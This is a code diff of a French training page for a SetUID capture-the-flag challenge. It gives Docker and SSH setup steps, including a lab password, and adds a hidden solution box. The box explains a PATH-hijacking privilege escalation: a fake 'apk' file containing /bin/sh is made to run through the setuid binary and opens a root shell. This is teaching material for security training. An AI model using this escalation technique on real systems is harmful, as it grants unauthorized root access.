@@ -10,10 +10,9 @@ include $_SERVER['DOCUMENT_ROOT'] . "/core/header.php"; // header universel
 <h2>SetUID</h2>
 
 <p>
-Ce challenge vous permet de vous familiariser avec les fichiers SetUID sur Linux. 
-Vous allez analyser un binaire avec des permissions spéciales, comprendre son comportement,
-et utiliser les outils Docker fournis pour le tester en toute sécurité.
+Un programme est fourni par l'administrateur (probablement un ciel)  pour permettre à tous les utilisateurs de faire des mises à jour du système à l'aide du Setuid. 
 </p>
+
 <!-- Formulaire pour vérifier la réponse -->
 <div style="margin-top: 30px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; max-width: 500px;">
     <h3>Vérifier votre réponse</h3>
@@ -42,7 +41,7 @@ et utiliser les outils Docker fournis pour le tester en toute sécurité.
 
     <!-- Colonne gauche : Commandes utiles -->
     <div class="commands" style="flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
-        <h3>Etapes à suivre</h3>
+        <h3>Étapes à suivre</h3>
         <pre>
 # Charger l'image téléchargée
 docker load -i  t00-ch00-setuid.tar
@@ -51,11 +50,12 @@ docker load -i  t00-ch00-setuid.tar
 docker compose up -d
 
 # Se connecter en ssh au container mdp : toor
-ssh user@localhost -p 2222
+ssh ciel@localhost -p 2222
 
-# A LA FIN DU CHALLENGE : ARRTER ET SUPPRIMER LE CONTAINER 
+# A LA FIN DU CHALLENGE : ARRÊTER ET SUPPRIMER LE CONTAINER 
 docker compose down
-#Effacer la connexion ssh
+
+# Effacer la connexion ssh
 ssh-keygen -f '~/.ssh/known_hosts' -R '[localhost]:2222'
         </pre>
     </div>
@@ -65,12 +65,58 @@ ssh-keygen -f '~/.ssh/known_hosts' -R '[localhost]:2222'
         <h3>Fichiers à télécharger</h3>
         <ul>
             <li><a href="/formation/2026/00-script/00-setuid/t00-ch00-setuid.tar">Image Docker (.tar)</a></li>
-            <li><a href="/formation/2026/00-setuid/00-script/00-setuid/docker-compose.yml">docker-compose.yml</a></li>
+            <li><a href="/formation/2026/00-script/00-setuid/docker-compose.yml">docker-compose.yml</a></li>
         </ul>
     </div>
 
 </div>
 
+<!-- BOUTON POUR AFFICHER LA SOLUTION -->
+<div style="width: 100%; padding: 20px; border: 1px solid #aaa; border-radius: 8px; margin-top: 30px;">
+
+    <button onclick="toggleBox()" 
+            style="padding: 10px 18px; font-size: 16px; cursor: pointer;">
+        Afficher des éléments de correction (tricheur)
+    </button>
+
+    <div id="boxContent" style="display: none; margin-top: 20px; background: #f8f8f8; padding: 15px; border-radius: 6px;">
+
+        <p>
+            Vous créez un faux programme <code>apk</code> contenant <code>/bin/sh</code>, puis vous le rendez exécutable.
+            Ensuite, vous ajoutez votre dossier personnel au <code>PATH</code> afin que le système utilise votre faux binaire
+            au lieu de l’outil système. En lançant le challenge, celui-ci exécute alors votre <code>apk</code>, ce qui ouvre un shell root.
+        </p>
+
+        <pre style="white-space: pre-wrap; width: 100%;">
+echo "/bin/sh" > apk
+chmod 766 apk
+
+export PATH="/home/ciel:$PATH"
+which apk   → /home/ciel/apk
+
+./chall00   → exécution du faux apk → shell root
+cat flag.txt
+        </pre>
+
+    </div>
+</div>
+
+<script>
+function toggleBox() {
+    const box = document.getElementById("boxContent");
+    box.style.display = box.style.display === "none" ? "block" : "none";
+}
+</script>
+
+
+<script>
+function toggleSolution() {
+    const sol = document.getElementById("solution");
+    sol.style.display = sol.style.display === "none" ? "block" : "none";
+}
+</script>
+
 <?php
 include $_SERVER['DOCUMENT_ROOT'] . "/core/footer.php"; // footer universel
 ?>
+
